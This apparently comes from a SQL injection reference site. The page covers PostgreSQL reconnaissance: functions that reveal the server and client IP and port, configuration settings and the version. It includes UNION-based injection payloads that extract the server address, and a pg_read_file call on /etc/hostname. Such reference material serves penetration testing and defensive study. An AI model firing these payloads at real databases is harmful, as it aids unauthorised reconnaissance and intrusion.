---
title: Server Hostname
description: Obtaining the PostgreSQL server hostname and network information
category: Information Gathering
order: 7
tags: ["hostname", "network", "reconnaissance"]
lastUpdated: 2025-12-07
---

## Server Hostname and Network Information

PostgreSQL provides several functions to retrieve server network information.

### Server IP Address

```sql
-- Get server IP address
SELECT inet_server_addr();
```

### Server Port

```sql
-- Get server port
SELECT inet_server_port();
```

### Client Information

```sql
-- Get client IP address
SELECT inet_client_addr();

-- Get client port
SELECT inet_client_port();
```

### Combined Network Information

```sql
-- Get all network information
SELECT
    inet_server_addr() AS server_ip,
    inet_server_port() AS server_port,
    inet_client_addr() AS client_ip,
    inet_client_port() AS client_port;
```

### Configuration Settings

```sql
-- Get listen addresses
SELECT current_setting('listen_addresses');

-- Get port configuration
SELECT current_setting('port');

-- Get data directory
SELECT current_setting('data_directory');
```

### Injection Examples

```sql
-- UNION-based
' UNION SELECT NULL,inet_server_addr()::text,NULL--
' UNION SELECT NULL,inet_server_port()::text,NULL--

-- Combined extraction
' UNION SELECT NULL,inet_server_addr()::text||':'||inet_server_port()::text,NULL--
```

### Operating System Information

```sql
-- Get server version (includes OS info)
SELECT version();
-- Example: "PostgreSQL 14.5 on x86_64-pc-linux-gnu..."

-- Try to read hostname from file (requires privileges)
SELECT pg_read_file('/etc/hostname');
```

### Notes

- `inet_server_addr()` returns NULL if connecting via Unix socket
- `inet_server_port()` returns the actual TCP port the server is listening on
- These functions may return NULL depending on connection type
- Superuser privileges may be needed for some configuration settings
